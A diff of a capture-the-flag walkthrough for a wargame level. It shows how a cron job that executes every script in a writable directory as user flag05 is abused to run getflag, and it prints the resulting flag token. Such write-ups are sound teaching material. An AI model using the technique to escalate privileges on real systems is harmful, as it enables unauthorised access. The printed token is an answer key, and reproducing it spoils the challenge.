@@ -1,23 +1,25 @@
-find / -user flag05 2>/dev/null
->/usr/sbin/openarenaserver
->/rofs/usr/sbin/openarenaserver
+>You got a new mail
 
-cd /var/mail/
-cat level05
-> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+>find / -user flag05 2>/dev/null
+    /usr/sbin/openarenaserver
+    /rofs/usr/sbin/openarenaserver
 
-cat /usr/sbin/openarenaserver
->#!/bin/sh
->
->for i in /opt/openarenaserver/* ; do
->	(ulimit -t 5; bash -x "$i")
->	rm -f "$i"
->done
+>cd /var/mail/
+>cat level05
+    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 
-ls /opt/openarenaserver/
->
+>cat /usr/sbin/openarenaserver
+    #!/bin/sh
 
-echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
+    for i in /opt/openarenaserver/* ; do
+    	(ulimit -t 5; bash -x "$i")
+    	rm -f "$i"
+    done
 
-cat /tmp/flag
->Check flag.Here is your token : viuaaale9huek52boumoomioc
+>ls /opt/openarenaserver/
+
+
+>echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
+
+>cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
